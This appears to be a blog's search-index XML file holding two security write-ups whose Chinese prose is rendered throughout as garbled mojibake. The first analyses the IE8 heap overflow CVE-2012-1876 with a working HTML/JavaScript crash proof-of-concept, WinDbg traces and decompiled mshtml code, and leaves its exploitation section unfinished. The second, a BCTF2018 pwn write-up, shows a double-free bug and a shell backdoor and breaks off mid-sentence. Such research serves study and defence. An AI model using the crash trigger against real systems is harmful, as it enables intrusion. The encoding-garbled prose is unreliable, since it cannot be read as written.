<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[IE8æ¼æ´ž[cve-2012-1876]åˆ†æž]]></title>
    <url>%2Fpost%2Fb72ee585.html</url>
    <content type="text"><![CDATA[ç¬¬ä¸€æ¬¡æŽ¥è§¦ctfå¤–çš„æ¼æ´žï¼Œè·Ÿç€å„ä¸ªå¸ˆå‚…çš„åšå®¢å’Œã€Šæ¼æ´žæˆ˜äº‰ã€‹æŠ˜è…¾äº†å¥½å‡ å¤©ï¼Œä¹Ÿç»ˆäºŽç®—æ˜¯æˆåŠŸäº†ã€‚åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±æ•´ä¸ªè°ƒè¯•è¿‡ç¨‹ï¼Œåšä¸ªæ€»ç»“ã€‚è°ƒè¯•çŽ¯å¢ƒwindows7 32ä½(IEç‰ˆæœ¬: 8.0.7600.16385)windbgImmunity DebuggerPOCè°ƒè¯•pocä»£ç ï¼š123456789101112131415&lt;html&gt;&lt;body&gt; &lt;table style="table-layout:fixed" &gt; &lt;col id="132" width="41" span="1" &gt;&amp;nbsp;&lt;/col&gt; &lt;/table&gt; &lt;script&gt; function over_trigger() &#123; var obj_col = document.getElementById("132"); obj_col.width = "42765"; obj_col.span = 1000; &#125; setTimeout("over_trigger();",1); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;åŸºäºŽHPAçš„æ¼æ´žåˆ†æžæ–¹æ³•é¦–å…ˆç”¨gflag.exeå¯¹IEè¿›ç¨‹å¼€å¯hpaé€‰é¡¹(gflag.exeä½äºŽwindbgæ–‡ä»¶å¤¹ä¸‹)ï¼šgflag.exe -i iexplore.exe +hpaç”¨IEæ‰“å¼€poc.htmlï¼Œç„¶åŽä½¿ç”¨windbgå¯¹è¿›ç¨‹è¿›è¡Œattachã€‚æ­¤å¤„æ³¨æ„é€‰æ‹©ä½ç½®é ä¸‹çš„ä¸€ä¸ªè¿›ç¨‹ã€‚ç„¶åŽå‘½ä»¤gï¼Œç»§ç»­è¿è¡Œã€‚åœ¨æµè§ˆå™¨ä¸­å…è®¸é˜»æ­¢çš„å†…å®¹ã€‚ç„¶åŽå°±å¯ä»¥å‘çŽ°windbgæ–­ä¸‹äº†123456789101112131415161718192021220:005&gt; g(644.3a8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000009 ebx=00001482 ecx=00010689 edx=00000014 esi=08128000 edi=08128018eip=6ad1f167 esp=045edf08 ebp=045edf14 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mshtml!CTableColCalc::AdjustForCol+0x15:6ad1f167 890f mov dword ptr [edi],ecx ds:0023:08128018=????????0:005&gt; kbChildEBP RetAddr Args to Child 045edf14 6ab95b8e 00001482 045ee258 00000001 mshtml!CTableColCalc::AdjustForCol+0x15045edfc4 6aa00713 00000001 045ee258 000003e8 mshtml!CTableLayout::CalculateMinMax+0x52f045ee1e0 6a9eaf19 045ee258 045ee224 00000001 mshtml!CTableLayout::CalculateLayout+0x276045ee38c 6aadcc48 045efa00 045ee5b8 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720045ee4c4 6aacf5d0 04d00ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8045ee588 6aacf31d 04d00ea8 00016747 00016747 mshtml!CFlowLayout::MeasureSite+0x312045ee5d0 6aacf664 09330f00 00000061 045efa00 mshtml!CFlowLayout::GetSiteWidth+0x156045ee610 6aacfb40 09224fb0 04d00ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce045ee694 6eef665d 09244ff8 045ee6b4 045ee778 mshtml!CEmbeddedILSObj::Fmt+0x150......å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ç”±äºŽediä¸­å‚¨å­˜äº†ä¸€ä¸ªéžæ³•åœ°å€è€Œé€ æˆçš„å´©æºƒé€šè¿‡æ±‡ç¼–ä»£ç å¾€ä¸Šå›žæº¯ï¼Œå‘çŽ°ediçš„å€¼æ¥è‡ªäºŽ[esi+0x18]ï¼Œè€Œåœ¨å½“å‰å‡½æ•°ä¸­æ²¡æœ‰esiçš„å¤„ç†ä»£ç ï¼Œæ‰€ä»¥å¾€ä¸Šå±‚å‡½æ•°çœ‹ï¼Œå®šä½åˆ°mshtml!CTableLayout::CalculateMinMaxï¼Œåœ¨æ­¤å¤„ä¸‹ä¸Šæ–­ç‚¹ï¼Œé‡æ–°attachè°ƒè¯•ã€‚å› ä¸ºä¸‹æ–­ç‚¹å‰è¦ç¡®ä¿æ‰€åœ¨æ¨¡å—å·²ç»è¢«åŠ è½½ï¼Œæ‰€ä»¥é€šè¿‡sxe ld:mshtmlè®©ç¨‹åºåœ¨åŠ è½½mshtmlåŽæ–­ä¸‹ã€‚123456789101112130:013&gt; lmm mshtmlstart end module name6afb0000 6b562000 mshtml (pdb symbols) C:\Users\hgy\Desktop\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb0:013&gt; bp mshtml!CTableLayout::CalculateMinMax0:013&gt; bl 0 e 6b0c018a 0001 (0001) 0:**** mshtml!CTableLayout::CalculateMinMax0:013&gt; gBreakpoint 0 hiteax=ffffffff ebx=08251ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=045ee604eip=6b0c018a esp=045ee3a8 ebp=045ee5c0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax:6b0c018a 8bff mov edi,ediç»§ç»­å•æ­¥æ‰§è¡Œï¼š123456789101112131415161718192021222324252627282930313233343536373839404142430:005&gt; peax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018c esp=0462e288 ebp=0462e4a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x2:6878018c 55 push ebp0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018d esp=0462e284 ebp=0462e4a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x3:6878018d 8bec mov ebp,esp0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018f esp=0462e284 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x5:6878018f 81ec90000000 sub esp,90h0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780195 esp=0462e1f4 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xb:68780195 53 push ebx0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780196 esp=0462e1f0 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xc:68780196 8b5d08 mov ebx,dword ptr [ebp+8] ss:0023:0462e28c=05f8cea80:005&gt; dd poi(ebp+8)05f8cea8 68679868 0562cf30 05f7efb8 6883491805f8ceb8 00000001 00000000 0108080d ffffffff05f8cec8 00000000 00000000 00000000 ffffffff05f8ced8 00016747 00009d9e 00000000 0000000005f8cee8 00000000 00412802 00000000 0000000005f8cef8 00000000 00000001 ffffffff ffffffff05f8cf08 ffffffff ffffffff 68679fd0 0000000405f8cf18 00000004 08c50ff0 68679fd0 000000040:005&gt; ln 68679868 (68679868) mshtml!CTableLayout::`vftable&apos; | (686799a8) mshtml!CTableLayoutBlock::`vftable&apos;Exact matches: mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;æˆ‘ä»¬çŸ¥é“ï¼Œebp+8æ˜¯å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å€¼ï¼Œã€Šæ¼æ´žæˆ˜äº‰ã€‹ä¸­æŒ‡å‡ºè¯¥å‚æ•°æ˜¯CTableLayoutå¯¹è±¡æŒ‡æ­£ï¼Œä¹Ÿå°±æ˜¯&lt;table>æ ‡ç­¾åœ¨å†…å­˜ä¸­çš„å¯¹è±¡ã€‚é€šè¿‡é…åˆIDAåŠ è½½ç¬¦å·ä¿¡æ¯ä¹Ÿå¯å¾—å‡ºè¯¥ç»“è®º:void __thiscall CTableLayout::CalculateMinMax(CTableLayout *this, struct CTableCalcInfo *a2, int a3, int a4)ç»§ç»­å•æ­¥1234567891011121314151617181920212223242526272829300:005&gt; peax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780199 esp=0462e1f0 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xf:68780199 56 push esi0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878019a esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x10:6878019a 8b750c mov esi,dword ptr [ebp+0Ch] ss:0023:0462e290=0462e5180:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=6878019d esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x13:6878019d 8b4628 mov eax,dword ptr [esi+28h] ds:0023:0462e540=000000000:005&gt; eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=687801a0 esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x16:687801a0 898574ffffff mov dword ptr [ebp-8Ch],eax ss:0023:0462e1f8=011710000:005&gt; eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=687801a6 esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1c:687801a6 8b4354 mov eax,dword ptr [ebx+54h] ds:0023:05f8cefc=00000001å¯ä»¥çœ‹åˆ°åœ¨ebx+0x54å¤„å‚¨å­˜çš„å€¼ä¸º1ï¼Œã€Šæ¼æ´žæˆ˜äº‰ã€‹ä¸­æŒ‡å‡ºæ­¤å¤„å³ä¸ºPOCä¸­colæ ‡ç­¾çš„spanå€¼ï¼Œè®°ä½œspannumã€‚ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼ŒåŒæ—¶é…åˆIDAæŸ¥çœ‹CalculateMinMaxå‡½æ•°æœ‰è¿™ä¹ˆä¸€æ®µæŒ‡ä»¤ï¼š1234567891011121314151617181920212223242526272829303132687802cc 8b8394000000 mov eax,dword ptr [ebx+94h] ; å–å‡ºspancmp687802d2 c1e802 shr eax,2687802d5 3bc2 cmp eax,edx ; å°†spannumå€¼ä¸Žspancmp/2æ¯”è¾ƒ687802d7 7d39 jge mshtml!CTableLayout::CalculateMinMax+0x1fa (68780312)687802d9 3bd7 cmp edx,edi687802db 8db390000000 lea esi,[ebx+90h]687802e1 0f8c9bcbefff jl mshtml!CTableLayout::CalculateMinMax+0x1da (6867ce82)687802e7 3b5608 cmp edx,dword ptr [esi+8]687802ea 7613 jbe mshtml!CTableLayout::CalculateMinMax+0x1e7 (687802ff)687802ec 6a1c push 1Ch687802ee 8bc2 mov eax,edx687802f0 8bfe mov edi,esi687802f2 e8c08c0c00 call mshtml!CImplAry::EnsureSizeWorker (68848fb7)0:005&gt; ga 687802cc eax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802cc esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:687802cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:05f8cf3c=000000000:005&gt; peax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802d2 esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:687802d2 c1e802 shr eax,20:005&gt; peax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802d5 esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1ba:687802d5 3bc2 cmp eax,edxå¯ä»¥çœ‹åˆ°ç¨‹åºèŽ·å–äº†ä¸€ä¸ªspancmpå€¼ï¼Œé™¤ä»¥2ä¹‹åŽä¸Žspannumæ¯”è¾ƒï¼Œè‹¥spannum &lt;= spancmp/4åˆ™è·³è½¬ã€‚æ­¤æ—¶spannum == 1ã€spancmp/4 == 0æ‰€ä»¥ä¸ä¼šå‘ç”Ÿè·³è½¬ï¼Œç¨‹åºç»§ç»­å¾€åŽæ‰§è¡Œç›´åˆ°call mshtml!CImplAry::EnsureSizeWorkerIDAåç¼–è¯‘çš„å‡½æ•°å‚æ•°ä¸ºCImplAry::EnsureSizeWorker(v43, v157, (int)v37 + 0x90, 0x1Cu, (int)v125);è·Ÿè¿›è¯¥å‡½æ•°ï¼ˆIDAï¼‰:12345678910111213141516171819202122232425262728293031int __userpurge CImplAry::EnsureSizeWorker@&lt;eax&gt;(CImplAry *this@&lt;ecx&gt;, unsigned int a2@&lt;eax&gt;, int a3@&lt;edi&gt;, unsigned int MaxCount, int a5)&#123; //MaxCount == 0x1C //a2 == spannum ... v5 = a2; v14 = 4; if ( a2 &gt;= 4 ) &#123; v14 = a2; if ( a2 &gt; 4 ) &#123; v6 = ULongAdd(*(_DWORD *)(a3 + 8), *(_DWORD *)(a3 + 8) &gt;&gt; 1, &amp;v14); if ( v6 ) return v6; if ( v5 &gt; v14 ) v14 = v5; &#125; &#125; v6 = ULongLongToUInt(&amp;dwBytes, MaxCount * (unsigned __int64)v14, v11); if ( !v6 ) &#123; if ( *(_BYTE *)(a3 + 4) &amp; 2 ) &#123; ...//ä¸ä¼šè¿›å…¥æ­¤å¤„ &#125; v6 = _HeapRealloc((LPVOID *)(a3 + 12), dwBytes, v12); ... &#125; return v6;&#125;å…¶ä¸­ULongLongToIntçš„åŠŸèƒ½ä¸º:12if MaxCount*v14 &gt; 0xFFFFFFFFï¼ŒdwBytes = -1;else dwBytes = MaxCount*v14;åˆ†æžåŽå¯ä»¥å¾—çŸ¥ï¼Œè¯¥å‡½æ•°å°†ä¼šé€šè¿‡_HeapRealloc()æ¥ç”³è¯·ä¸€ä¸ªå †ç©ºé—´ï¼ŒdwBytesä¸ºè¯¥ç©ºé—´çš„å¤§å°ã€‚åŒæ—¶dwBytes = (spannum &gt; 4 ? spannum : 4) * 0x1cå› ä¸ºæˆ‘ä»¬çš„spannum == 1ï¼Œæ‰€ä»¥å°†ä¼šåˆ†é…4*0x1c == 0x70å¤§å°çš„ç©ºé—´è§‚å¯Ÿ_HeapReallocå‡½æ•°ï¼Œå¯çŸ¥åˆ†é…çš„ç©ºé—´åœ°å€å°†ä¼šè¢«esiå¼•ç”¨ã€‚1234567891011121314151617181920210:005&gt; peax=00000000 ebx=00000000 ecx=00000070 edx=00000000 esi=088faf44 edi=088faf38eip=68d38ff6 esp=0460e040 ebp=0460e054 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0x9c:68d38ff6 e86edcfdff call mshtml!_HeapRealloc (68d16c69)0:005&gt; peax=00000000 ebx=00000000 ecx=77bc349f edx=00000000 esi=088faf44 edi=088faf38eip=68d38ffb esp=0460e044 ebp=0460e054 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0xa1:68d38ffb 8bd8 mov ebx,eax0:005&gt; dd poi(esi)08c76f90 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fa0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fb0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fc0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76ff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c77000 ???????? ???????? ???????? ????????æ³¨æ„ï¼Œå…³é—­äº†hpaé€‰é¡¹åŽï¼Œå †å†…å­˜ä¸ä¼šè¢«åˆå§‹åŒ–ä¸º0xc0ã€‚ä¿æŒmshtml!CTableLayout::CalculateMinMaxå¤„çš„æ–­ç‚¹ï¼Œè®©ç¨‹åºç»§ç»­è¿è¡Œï¼Œå†æ¬¡åœ¨è¯¥å‡½æ•°æ–­ä¸‹ã€‚å¾€åŽè¿è¡Œåˆ°spannumä¸Žspancmpæ¯”è¾ƒå¤„:123456789101112131415161718192021222324250:005&gt; gBreakpoint 1 hiteax=00000000 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702cc esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:68c702cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:088faf3c=000000040:005&gt; peax=00000004 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d2 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:68c702d2 c1e802 shr eax,20:005&gt; eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d5 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1ba:68c702d5 3bc2 cmp eax,edx0:005&gt; eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d7 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1bc:68c702d7 7d39 jge mshtml!CTableLayout::CalculateMinMax+0x1fa (68c70312) [br=1]å‘çŽ°spancmp == 4ã€spannum == 1æ­¤æ—¶spancmp/4 == spannumï¼Œå°†ä¼šå‘ç”Ÿè·³è½¬ï¼Œæ„å‘³ç€ä¸ä¼šå†æ‰§è¡ŒCImplAry::EnsureSizeWorkerå‡½æ•°ã€‚åœ¨èŽ·å–spanå€¼çš„å‡½æ•°mshtml!CTableCol::GetAAspanä¸‹æ–­12345678910111213140:005&gt; bp mshtml!CTableCol::GetAAspan0:005&gt; gBreakpoint 2 hiteax=08776fd0 ebx=088faea8 ecx=00000031 edx=00000000 esi=08c76fac edi=08776fd0eip=68bfa007 esp=0460d874 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableCol::GetAAspan:68bfa007 8bff mov edi,edi0:005&gt; gueax=000003e8 ebx=088faea8 ecx=00000002 edx=08d2dff0 esi=08c76fac edi=08776fd0eip=68e05a33 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x383:68e05a33 3de8030000 cmp eax,3E8hå‘çŽ°æ‰§è¡Œå®Œæ­¤å‡½æ•°åŽï¼Œè¿”å›žå€¼(eax)çš„å€¼å·²ç»å˜ä¸ºäº†0x3e8ï¼Œå³POCä¸­æ‰€è®¾ç½®çš„1000åœ¨å‡½æ•°mshtml!CWidthUnitValue::GetPixelWidthå¤„ä¸‹æ–­12345678910111213140:005&gt; bp mshtml!CWidthUnitValue::GetPixelWidth0:005&gt; gBreakpoint 1 hiteax=0047e278 ebx=00442380 ecx=004ee070 edx=004af208 esi=0249e2d8 edi=00000001eip=66ce63d8 esp=0249df9c ebp=0249e044 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CWidthUnitValue::GetPixelWidth:66ce63d8 8bff mov edi,edi0:005&gt; gueax=00001405 ebx=00442380 ecx=004ee070 edx=00000014 esi=0249e2d8 edi=00000001eip=66f35ab8 esp=0249dfa8 ebp=0249e044 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x459:66f35ab8 837da400 cmp dword ptr [ebp-5Ch],0 ss:0023:0249dfe8=00000000å¯ä»¥çœ‹åˆ°è¿”å›žå€¼ä¸º(eax)ä¸º0x1405ï¼Œè¯¥è¿”å›žå€¼ä¸ºpocä¸­colæ ‡ç­¾çš„width * 125ï¼ˆæ³¨ï¼šã€Šæ¼æ´žæˆ˜äº‰ã€‹å’Œå…¶ä»–å¸ˆå‚…çš„åšå®¢ä¸­è¯¥å€¼éƒ½ä¸ºwidth * 100ï¼Œå¯èƒ½æ˜¯ç³»ç»Ÿé…ç½®çš„åŽŸå› ã€‚ã€‚æˆ‘ä¹Ÿå¾ˆç»æœ›å•Šï¼‰æŽ¥ä¸‹æ¥å›žåˆ°è®©ç¨‹åºå´©æºƒçš„åœ°æ–¹123456789101112131415161718192021222324252627282930v158 = CTableCell::GetAAcolSpan(v29);...v153 = 0;if ( v158 &gt; 0 )&#123; v99 = 28 * v156; v144 += v158; for ( i = 28 * v156; ; v99 = i ) &#123; v149 = (const struct CWidthUnitValue **)(v99 + *((_DWORD *)v37 + 39)); if ( v151 &amp;&amp; v158 &gt; 1 &amp;&amp; v153 == (CTableLayout *)(v158 - 1) ) &#123; v100 = (_DWORD)v155 * (v158 - 1); v99 = v147 - v100; v155 = (struct CWidthUnitValue *)(v147 - v100); &#125; CTableColCalc::AdjustForCol( (CTableColCalc *)v99, (const struct CWidthUnitValue **)v145, v149, v155, a3, v143, (int)v125); v153 = (CTableLayout *)((char *)v153 + 1); i += 28; if ( (signed int)v153 &gt;= v158 ) break; &#125;&#125;ç¨‹åºä¼šå¾ªçŽ¯è°ƒç”¨CTableColCalc::AdjustForColï¼Œè°ƒç”¨æ¬¡æ•°ç”±v158æŽ§åˆ¶ï¼Œå³è°ƒç”¨spannumæ¬¡12345678910111213141516171819202122232425262728293031320:005&gt; gBreakpoint 1 hiteax=004793d0 ebx=00421110 ecx=0000001c edx=00000014 esi=00450ffc edi=00000001eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableColCalc::AdjustForCol:670bf152 8bff mov edi,edi0:005&gt; dd 450fe000450fe0 00001405 00001405 00001405 00000000 00450ff0 0045f2d0 00000000 00014058 0000000000451000 004604a0 00000004 00000000 004307f800451010 00000000 00431298 00000000 0000001100451020 00000012 ffffffff 003b74ec 0000000000451030 00000017 00000017 003b74b8 0000000500451040 004432a4 003b74b8 00450c50 0000000d00451050 323f985f 8000f2d0 003a005c 0055005c0:005&gt; gBreakpoint 1 hiteax=004793d0 ebx=00421110 ecx=00000038 edx=00000014 esi=00451018 edi=00000001eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableColCalc::AdjustForCol:670bf152 8bff mov edi,edi0:005&gt; dd 450fe000450fe0 00001405 00001405 00001405 0000000000450ff0 0045f2d0 00000000 00014058 00001405 00451000 00001405 00001405 00000000 004307f800451010 00000000 00014058 00000000 0000001100451020 00000012 ffffffff 003b74ec 0000000000451030 00000017 00000017 003b74b8 0000000500451040 004432a4 003b74b8 00450c50 0000000d00451050 323f985f 8000f2d0 003a005c 0055005cå¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡æ‰§è¡Œéƒ½ä¼šå°†GetPixelWidthå‡½æ•°èŽ·å–çš„0x1405å¤åˆ¶åˆ°è¯¥ç‰‡å†…å­˜ä¸­ã€‚ç”±äºŽspannumå·²ç»è¢«ä¿®æ”¹ä¸º1000ï¼Œæ‰€ä»¥ä¼šè¦†ç›–åˆ°1000 * 0x1cå¤§å°çš„ç©ºé—´ã€‚è€Œå †å—å¤§å°åªæœ‰0x70ï¼Œæ‰€ä»¥ä¸€å®šä¼šå¯¼è‡´å †æº¢å‡ºï¼Œä»Žè€Œcrashã€‚pocæ€»ç»“åœ¨é¦–æ¬¡è°ƒç”¨CTableLayout::CalculateMinMaxæ—¶ï¼Œç”±äºŽspannum == 1ã€spancmp == 0ï¼Œä»Žè€Œè°ƒç”¨CImplAry::EnsureSizeWorkerå‡½æ•°ï¼Œåˆ†é…äº†4*0x1c == 0x70å¤§å°çš„å†…å­˜å—pocä¸­é€šè¿‡jsä¿®æ”¹äº†spanå€¼ä¹‹åŽï¼Œå†æ¬¡è°ƒç”¨CTableLayout::CalculateMinMaxæ—¶ï¼Œspannum == 1ã€spancmp == 4ï¼Œç”±äºŽæ»¡è¶³spannum &lt;= spancmp/4ï¼Œæ‰€ä»¥å‘ç”Ÿè·³è½¬ï¼Œæ²¡æœ‰é‡æ–°åˆ†é…å†…å­˜å—ã€‚åœ¨CTableColCalc::AdjustForColå‡½æ•°ä¸­ï¼Œå› ä¸ºspannumè¢«ä¿®æ”¹ä¸º1000ï¼Œæ‰€ä»¥å°†è¦å†™å…¥çš„å†…å­˜åŒºåŸŸè¿œè¿œè¶…è¿‡åˆ†é…å¥½çš„åŒºåŸŸï¼Œé€ æˆæº¢å‡ºã€‚æ¼æ´žåˆ©ç”¨åˆ†æž// TODO]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>å †åˆ©ç”¨</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF2018 easiest writeup]]></title>
    <url>%2Fpost%2Faaf4d161.html</url>
    <content type="text"><![CDATA[å¹¶æ²¡æœ‰å‚åŠ è¿™æ¬¡bctfï¼Œåªæœ‰äº‹åŽçœ‹çœ‹é¢˜ç›®ï¼Œè¿™é“é¢˜ç›®ä¸ç®—éš¾ï¼Œä¸è¿‡è¿˜æ˜¯å­¦åˆ°äº†ä¸€äº›ä»¥å‰ä¸æ˜¯å¾ˆæ¸…æ¥šçš„ä¸œè¥¿ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ã€‚é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼š BCTF 2018çŸ¥è¯†ç‚¹ï¼šfastbin_attackã€IO_FILEé¢˜ç›®æä¾›çš„åŠŸèƒ½éžå¸¸ç®€å•ï¼Œåªæœ‰addå’Œdelete123456int menu()&#123; puts("HI!"); puts("1 add "); return puts("2 delete ");&#125;ä¿æŠ¤æƒ…å†µï¼š123456[*] '/home/hgy/pwn/bctf2018/easiest/easiest' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)æ¼æ´žæƒ…å†µ12345678910111213int remove()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("(0-11):"); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 || v1 &gt; 11 ) exit(1); free(ptr[v1]); return puts("delete success !");&#125;åœ¨removeæ—¶ï¼Œæ²¡æœ‰æ¸…ç©ºptræŒ‡é’ˆï¼Œå­˜åœ¨double freeã€‚1234int sub_400946()&#123; return system("/bin/sh");&#125;è¿˜æœ‰ä¸€ä¸ªåŽé—¨å‡½æ•°ã€‚ã€‚åˆ©ç”¨è¿‡ç¨‹å› ä¸ºæ²¡æœ‰è¾“å‡ºåŠŸèƒ½ï¼Œæ‰€ä»¥æ³„éœ²libcååˆ†å›°éš¾ï¼Œæ”¹malloc_hookä¹‹ç±»çš„ä¼°è®¡æ˜¯ä¸è¡Œäº†ã€‚æ‰€ä»¥æŠŠç›®æ 